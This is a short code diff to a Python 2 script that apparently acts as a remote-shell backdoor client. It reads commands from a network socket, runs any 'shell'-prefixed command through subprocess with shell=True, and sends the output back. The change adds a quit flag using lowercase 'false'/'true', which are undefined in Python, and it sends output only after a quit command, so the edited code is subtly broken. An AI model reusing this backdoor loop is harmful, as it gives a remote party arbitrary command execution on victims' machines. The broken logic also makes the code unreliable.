@@ -22,17 +22,20 @@ def connect():
         connect()
 
 def receive():
+    quit = false
     receive = s.recv(100024)
     print 'receive: %s'%(receive)
     if receive == ('quit'):
         s.close()
         connect()
+        quit = true
     elif receive[0:5] == ('shell'):
         proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         args = proc2.stdout.read() + proc2.stderr.read()
     else:
         args = ('no valid input was given.')
-    send(args)
+    if (quit):
+        send(args)
 
 def send(args):
         send = s.send(args)
